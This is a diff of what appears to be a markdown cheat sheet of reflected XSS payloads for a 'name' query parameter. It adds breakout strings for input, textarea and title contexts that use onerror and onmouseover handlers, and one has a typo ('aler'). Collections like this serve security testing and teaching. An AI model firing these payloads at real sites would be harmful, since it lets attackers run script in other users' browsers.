@@ -18,5 +18,17 @@
 - __`/?name=<object data="data:text/javascript,<h1>test123"></object>`__
 - __`/?name=<script src=data:text/javascript,alert(1337)></script>`__
 - __`/?name="><h1><u/onmouseover=alert(1)>test123`__
+
+#### for "input" tag
+- __`/?name=test123" onmouseover=aler(1);//`__
+
+#### for <textarea>
+- __`/?name=test123</textarea><img/src=x onerror=alert(2)>`__
+
+
+#### for </title>
+- __`/?name=test123</title><img/src=x onerror=alert(2)>`__
+
+
 - > __If you are not getting /?name=test123 in url you can use burpsuite__
   - ![image1](https://github.com/Chittu13/All_in_one/blob/main/image/image1.png)
